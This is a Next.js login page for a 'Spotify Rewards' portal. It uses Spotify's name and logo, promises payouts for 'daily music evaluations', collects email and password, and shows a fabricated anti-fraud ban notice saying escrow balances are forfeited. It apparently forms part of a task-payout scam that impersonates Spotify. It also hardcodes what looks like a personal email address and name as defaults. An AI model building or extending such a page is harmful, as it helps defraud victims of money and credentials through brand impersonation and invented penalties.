'use client';

import { Suspense, useState, useEffect } from 'react';
import Image from 'next/image';
import Link from 'next/link';
import { useRouter, useSearchParams } from 'next/navigation';
import { Lock, Mail, ArrowRight, ShieldCheck, Eye, EyeOff, CheckCircle2 } from 'lucide-react';
import { saveListenerAccount, getListenerAccount, verifyListenerLogin, checkAccountFraudBanStatus } from '../../../../lib/supabase';

function LoginFormContent() {
  const router = useRouter();
  const searchParams = useSearchParams();

  const [email, setEmail] = useState('');
  const [name, setName] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [isExistingUser, setIsExistingUser] = useState(false);

  useEffect(() => {
    const paramEmail = searchParams.get('email');
    const paramName = searchParams.get('name');

    let effectiveEmail = paramEmail || '';
    let effectiveName = paramName || '';

    if (typeof window !== 'undefined') {
      if (!effectiveEmail) {
        effectiveEmail = sessionStorage.getItem('spotify_listener_email') || 'silvakay583@gmail.com';
      }
      if (!effectiveName) {
        effectiveName = sessionStorage.getItem('spotify_listener_name') || 'Kay Silva';
      }
    } else {
      if (!effectiveEmail) effectiveEmail = 'silvakay583@gmail.com';
    }

    if (effectiveEmail) {
      setEmail(effectiveEmail);
      const existing = getListenerAccount(effectiveEmail);
      if (existing) {
        setIsExistingUser(true);
      }
    }
    if (effectiveName) {
      setName(effectiveName);
    }
  }, [searchParams]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage('');

    if (!email || !email.includes('@')) {
      setErrorMessage('Please provide a valid email address.');
      return;
    }

    if (!password || password.length < 4) {
      setErrorMessage('Password must be at least 4 characters.');
      return;
    }

    // Check if account is permanently blocked due to post-withdrawal anti-fraud audit
    const banStatus = checkAccountFraudBanStatus(email);
    if (banStatus.isBanned) {
      setErrorMessage(
        'ACCESS DENIED (CASE #SPT-FRAUD-8921): This listener account has been permanently blocked and terminated due to Anti-Fraud & Participant Guideline violations (Sections 2.2, 6.3 & 9.2). All escrow balances have been forfeited.'
      );
      return;
    }

    setIsSubmitting(true);

    try {
      const res = await verifyListenerLogin(email, password, name || 'Verified Listener');
      if (!res.success) {
        setErrorMessage(res.error || 'Failed to authenticate. Please check your credentials.');
        setIsSubmitting(false);
        return;
      }

      if (typeof window !== 'undefined') {
        sessionStorage.setItem('spotify_logged_in', 'true');
        sessionStorage.setItem('spotify_listener_email', email.trim().toLowerCase());
        if (name) sessionStorage.setItem('spotify_listener_name', name);
      }

      // Smooth transition to dashboard
      setTimeout(() => {
        router.push('/spotify/dashboard');
      }, 300);
    } catch {
      setErrorMessage('Error establishing session. Please try again.');
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#121212] text-white flex flex-col justify-between selection:bg-[#1db954] selection:text-black">
      {/* Top Bar with Spotify Logo */}
      <header className="p-6 sm:p-8 flex items-center justify-between border-b border-[#222222]">
        <div className="flex items-center gap-2.5">
          <div className="relative w-8 h-8 rounded-full overflow-hidden bg-black flex items-center justify-center">
            <Image
              src="/spotify-logo.webp"
              alt="Spotify Logo"
              width={32}
              height={32}
              priority
              referrerPolicy="no-referrer"
            />
          </div>
          <div className="flex items-center gap-1.5">
            <span className="text-white font-extrabold text-lg tracking-tight">Spotify</span>
            <span className="bg-[#1db954] text-black text-[10px] font-black uppercase px-2 py-0.5 rounded-full tracking-wider">
              Rewards
            </span>
          </div>
        </div>

        <div className="flex items-center gap-1.5 text-xs text-[#8a9890]">
          <ShieldCheck className="w-4 h-4 text-[#1db954]" />
          <span>Encrypted Portal</span>
        </div>
      </header>

      {/* Main Login / Account Setup Box */}
      <main className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-md bg-[#181818] p-8 sm:p-10 rounded-2xl border border-[#282828] shadow-2xl shadow-black relative overflow-hidden">
          {/* Subtle green ambient accent glow */}
          <div className="absolute top-0 right-0 w-32 h-32 bg-[#1db954]/10 rounded-full blur-2xl pointer-events-none -z-0" />

          <div className="text-center mb-8 relative z-10">
            <div className="w-12 h-12 mx-auto rounded-full bg-[#1db954]/15 text-[#1db954] border border-[#1db954]/30 flex items-center justify-center mb-4">
              <Lock className="w-6 h-6 stroke-[2.2]" />
            </div>

            <h1 className="text-2xl sm:text-3xl font-black text-white tracking-tight">
              {isExistingUser ? 'Welcome Back' : 'Create Your Password'}
            </h1>
            <p className="text-xs sm:text-sm text-[#a7a7a7] mt-2 leading-relaxed">
              {isExistingUser
                ? 'Sign in to access your daily music evaluations and payouts.'
                : 'Set a quick password to securely access your Spotify Rewards account.'}
            </p>
          </div>

          {errorMessage && (
            <div className="mb-5 p-3 rounded-xl bg-red-950/60 border border-red-500/40 text-red-200 text-xs font-semibold">
              {errorMessage}
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-4 relative z-10">
            {/* Email Field */}
            <div>
              <label className="block text-xs font-bold text-[#b3b3b3] uppercase tracking-wider mb-1.5">
                Email Address (Purchase Email)
              </label>
              <div className="relative">
                <Mail className="w-4 h-4 text-gray-500 absolute left-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
                <input
                  type="email"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="your@email.com"
                  className="w-full pl-10 pr-4 py-3 rounded-xl bg-[#242424] border border-[#3e3e3e] text-white text-sm focus:outline-none focus:border-[#1db954] transition-colors placeholder:text-[#666]"
                />
              </div>
            </div>

            {/* Password Field */}
            <div>
              <div className="flex items-center justify-between mb-1.5">
                <label className="block text-xs font-bold text-[#b3b3b3] uppercase tracking-wider">
                  {isExistingUser ? 'Password' : 'Create Password'}
                </label>
                <span className="text-[11px] text-[#888]">Min. 4 chars</span>
              </div>
              <div className="relative">
                <Lock className="w-4 h-4 text-gray-500 absolute left-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
                <input
                  type={showPassword ? 'text' : 'password'}
                  required
                  minLength={4}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="••••••••••••"
                  className="w-full pl-10 pr-11 py-3 rounded-xl bg-[#242424] border border-[#3e3e3e] text-white text-sm focus:outline-none focus:border-[#1db954] transition-colors placeholder:text-[#666]"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white transition-colors"
                >
                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full py-3.5 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] text-black font-extrabold text-sm sm:text-base flex items-center justify-center gap-2 transition-all shadow-lg shadow-[#1db954]/25 mt-4"
            >
              <span>{isSubmitting ? 'Accessing...' : isExistingUser ? 'Sign In to Dashboard' : 'Activate & Enter Dashboard'}</span>
              <ArrowRight className="w-4 h-4 stroke-[3]" />
            </button>
          </form>
        </div>
      </main>

      {/* Footer */}
      <footer className="p-6 text-center text-xs text-[#666] border-t border-[#222222]">
        &copy; {new Date().getFullYear()} Spotify Rewards Program • All rights reserved
      </footer>
    </div>
  );
}

export default function SpotifyLoginPage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-[#121212] flex items-center justify-center text-white text-sm">
          Loading Spotify Rewards Portal...
        </div>
      }
    >
      <LoginFormContent />
    </Suspense>
  );
}
